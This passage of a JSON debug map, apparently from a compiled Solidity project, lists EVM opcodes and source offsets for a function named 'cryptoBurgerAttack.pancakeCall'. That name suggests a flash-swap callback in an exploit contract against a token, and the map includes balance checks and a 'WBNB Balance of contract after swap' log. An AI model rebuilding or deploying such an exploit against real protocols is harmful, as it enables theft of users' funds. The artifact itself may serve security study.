      "op": "MSTORE"
    },
    "7008": {
      "offset": [
        526,
        568
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "7009": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9308
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x1F00CA74"
    },
    "7014": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9308
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "7015": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1B76"
    },
    "7018": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "7019": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9322,
        9337
      ],
      "op": "DUP7",
      "path": "0"
    },
    "7020": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9322,
        9337
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "7021": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9351,
        9355
      ],
      "op": "DUP7",
      "path": "0"
    },
    "7022": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9351,
        9355
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "7023": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "7025": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "ADD",
      "path": "0"
    },
    "7026": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2CED"
    },
    "7029": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        9258,
        9365
      ],
      "op": "JUMP",
      "path": "0"
    },
    "7030": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "7031": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "7033": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "7035": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "7036": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "DUP1",
      "path": "0"
    },
    "7037": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "DUP4",
      "path": "0"
    },
    "7038": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "SUB",
      "path": "0"
    },
    "7039": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "DUP2",
      "path": "0"
    },
    "7040": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "DUP7",
      "path": "0"
    },
    "7041": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "GAS",
      "path": "0"
    },
    "7042": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "7043": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "7044": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "DUP1",
      "path": "0"
    },
    "7045": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "7046": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1B93"
    },
    "7049": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "7050": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "7051": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "7053": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "DUP1",
      "path": "0"
    },
    "7054": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "7055": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "7056": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "7058": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "REVERT",
      "path": "0"
    },
    "7059": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "7060": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "POP",
      "path": "0"
    },
    "7061": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "POP",
      "path": "0"
    },
    "7062": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "POP",
      "path": "0"
    },
    "7063": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "POP",
      "path": "0"
    },
    "7064": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "7066": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "7067": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "7068": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "7070": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "DUP3",
      "path": "0"
    },
    "7071": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "7072": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "7074": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "7075": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "7076": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "DUP2",
      "path": "0"
    },
    "7077": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "ADD",
      "path": "0"
    },
    "7078": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "7080": {
      "op": "NOT"
    },
    "7081": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "AND",
      "path": "0"
    },
    "7082": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "DUP3",
      "path": "0"
    },
    "7083": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "ADD",
      "path": "0"
    },
    "7084": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "7086": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "7087": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1BBB"
    },
    "7090": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "7091": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "7092": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "DUP2",
      "path": "0"
    },
    "7093": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "ADD",
      "path": "0"
    },
    "7094": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "7095": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2D0E"
    },
    "7098": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        9258,
        9365
      ],
      "op": "JUMP",
      "path": "0"
    },
    "7099": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9258,
        9365
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "7100": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9243,
        9365
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "7101": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9243,
        9365
      ],
      "op": "POP",
      "path": "0"
    },
    "7102": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9375,
        9439
      ],
      "op": "PUSH2",
      "path": "0",
      "statement": 64,
      "value": "0x1BF1"
    },
    "7105": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "7107": {
      "op": "DUP1"
    },
    "7108": {
      "op": "MLOAD"
    },
    "7109": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "7111": {
      "op": "PUSH2",
      "value": "0x2F9E"
    },
    "7114": {
      "op": "DUP4"
    },
    "7115": {
      "op": "CODECOPY"
    },
    "7116": {
      "op": "DUP2"
    },
    "7117": {
      "op": "MLOAD"
    },
    "7118": {
      "op": "SWAP2"
    },
    "7119": {
      "op": "MSTORE"
    },
    "7120": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "7122": {
      "op": "DUP1"
    },
    "7123": {
      "op": "MLOAD"
    },
    "7124": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "7126": {
      "op": "PUSH2",
      "value": "0x2F7E"
    },
    "7129": {
      "op": "DUP4"
    },
    "7130": {
      "op": "CODECOPY"
    },
    "7131": {
      "op": "DUP2"
    },
    "7132": {
      "op": "MLOAD"
    },
    "7133": {
      "op": "SWAP2"
    },
    "7134": {
      "op": "MSTORE"
    },
    "7135": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9396,
        9408
      ],
      "op": "DUP4",
      "path": "0"
    },
    "7136": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9409,
        9410
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "7138": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9396,
        9411
      ],
      "op": "DUP2",
      "path": "0"
    },
    "7139": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9396,
        9411
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "7140": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9396,
        9411
      ],
      "op": "DUP2",
      "path": "0"
    },
    "7141": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9396,
        9411
      ],
      "op": "LT",
      "path": "0"
    },
    "7142": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9396,
        9411
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "7145": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9396,
        9411
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "7146": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9396,
        9411
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x614"
    },
    "7149": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9396,
        9411
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "7152": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        9396,
        9411
      ],
      "op": "JUMP",
      "path": "0"
    },
    "7153": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9375,
        9439
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "7154": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9576
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 65,
      "value": "0x0"
    },
    "7156": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9576
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "7157": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "7159": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "7160": {
      "op": "PUSH4",
      "value": "0x70A08231"
    },
    "7165": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "7167": {
      "op": "SHL"
    },
    "7168": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "DUP2",
      "path": "0"
    },
    "7169": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "7170": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9595,
        9599
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "7171": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "7173": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "DUP3",
      "path": "0"
    },
    "7174": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "ADD",
      "path": "0"
    },
    "7175": {
      "op": "MSTORE"
    },
    "7176": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "7178": {
      "op": "DUP1"
    },
    "7179": {
      "op": "MLOAD"
    },
    "7180": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "7182": {
      "op": "PUSH2",
      "value": "0x2FFE"
    },
    "7185": {
      "op": "DUP4"
    },
    "7186": {
      "op": "CODECOPY"
    },
    "7187": {
      "op": "DUP2"
    },
    "7188": {
      "op": "MLOAD"
    },
    "7189": {
      "op": "SWAP2"
    },
    "7190": {
      "op": "MSTORE"
    },
    "7191": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9490,
        9611
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "7192": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "7194": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "7196": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "7198": {
      "op": "SHL"
    },
    "7199": {
      "op": "SUB"
    },
    "7200": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9576
      ],
      "op": "AND",
      "path": "0"
    },
    "7201": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9576
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "7202": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9586
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x70A08231"
    },
    "7207": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9586
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "7208": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "7210": {
      "op": "ADD"
    },
    "7211": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "7213": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "7215": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "7216": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "DUP1",
      "path": "0"
    },
    "7217": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "DUP4",
      "path": "0"
    },
    "7218": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "SUB",
      "path": "0"
    },
    "7219": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "DUP2",
      "path": "0"
    },
    "7220": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "DUP7",
      "path": "0"
    },
    "7221": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "GAS",
      "path": "0"
    },
    "7222": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "7223": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "7224": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "DUP1",
      "path": "0"
    },
    "7225": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "7226": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1C47"
    },
    "7229": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "7230": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "7231": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "7233": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "DUP1",
      "path": "0"
    },
    "7234": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "7235": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "7236": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "7238": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "REVERT",
      "path": "0"
    },
    "7239": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "7240": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "POP",
      "path": "0"
    },
    "7241": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "POP",
      "path": "0"
    },
    "7242": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "POP",
      "path": "0"
    },
    "7243": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "POP",
      "path": "0"
    },
    "7244": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "7246": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "7247": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "7248": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "7250": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "NOT",
      "path": "0"
    },
    "7251": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "7253": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "DUP3",
      "path": "0"
    },
    "7254": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "ADD",
      "path": "0"
    },
    "7255": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "AND",
      "path": "0"
    },
    "7256": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "DUP3",
      "path": "0"
    },
    "7257": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "ADD",
      "path": "0"
    },
    "7258": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "DUP1",
      "path": "0"
    },
    "7259": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "7261": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "7262": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "POP",
      "path": "0"
    },
    "7263": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "DUP2",
      "path": "0"
    },
    "7264": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "ADD",
      "path": "0"
    },
    "7265": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "7266": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1C6B"
    },
    "7269": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "7270": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "7271": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2DCC"
    },
    "7274": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        9562,
        9601
      ],
      "op": "JUMP",
      "path": "0"
    },
    "7275": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9562,
        9601
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "7276": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9490,
        9611
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "7278": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9490,
        9611
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "7279": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9490,
        9611
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x1CC2"
    },
    "7282": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9490,
        9611
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "7283": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9490,
        9611
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "7284": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "7286": {
      "op": "DUP1"
    },
    "7287": {
      "op": "DUP3"
    },
    "7288": {
      "op": "MSTORE"
    },
    "7289": {
      "op": "PUSH1",
      "value": "0x27"
    },
    "7291": {
      "op": "SWAP1"
    },
    "7292": {
      "op": "DUP3"
    },
    "7293": {
      "op": "ADD"
    },
    "7294": {
      "op": "MSTORE"
    },
    "7295": {
      "op": "PUSH32",
      "value": "0x57424E422042616C616E6365206F6620636F6E74726163742061667465722073"
    },
    "7328": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "7330": {
      "op": "DUP3"
    },
    "7331": {
      "op": "ADD"
    },
    "7332": {
      "op": "MSTORE"
    },
    "7333": {
      "op": "PUSH7",
      "value": "0x3BB0B839971717"
    },
    "7341": {
      "op": "PUSH1",
      "value": "0xC9"
    },
    "7343": {
      "op": "SHL"
    },
    "7344": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "7346": {
      "op": "DUP3"
    },
    "7347": {
      "op": "ADD"
    },
    "7348": {
      "op": "MSTORE"
    },
    "7349": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "7351": {
      "op": "DUP2"
    },
    "7352": {
      "op": "ADD"
    },
    "7353": {
      "op": "SWAP2"
    },
    "7354": {
      "op": "SWAP1"
    },
    "7355": {
      "op": "SWAP2"
    },
    "7356": {
      "op": "MSTORE"
    },
    "7357": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "7359": {
      "op": "ADD"
    },
    "7360": {
      "op": "SWAP1"
    },
    "7361": {
      "op": "JUMP"
    },
    "7362": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9490,
        9611
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "7363": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9490,
        9611
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "7365": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9490,
        9611
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "7366": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9490,
        9611
      ],
      "op": "DUP1",
      "path": "0"
    },
    "7367": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9490,
        9611
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "7368": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9490,
        9611
      ],
      "op": "SUB",
      "path": "0"
    },
    "7369": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9490,
        9611
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "7370": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9490,
        9611
      ],
      "op": "LOG1",
      "path": "0"
    },
    "7371": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "7373": {
      "op": "DUP1"
    },
    "7374": {
      "op": "MLOAD"
    },
    "7375": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "7377": {
      "op": "PUSH2",
      "value": "0x2FFE"
    },
    "7380": {
      "op": "DUP4"
    },
    "7381": {
      "op": "CODECOPY"
    },
    "7382": {
      "op": "DUP2"
    },
    "7383": {
      "op": "MLOAD"
    },
    "7384": {
      "op": "SWAP2"
    },
    "7385": {
      "op": "MSTORE"
    },
    "7386": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9667,
        9679
      ],
      "op": "DUP2",
      "path": "0",
      "statement": 66
    },
    "7387": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        9680,
        9681
      ],
      "op": "PUSH1",
      "path": "0",
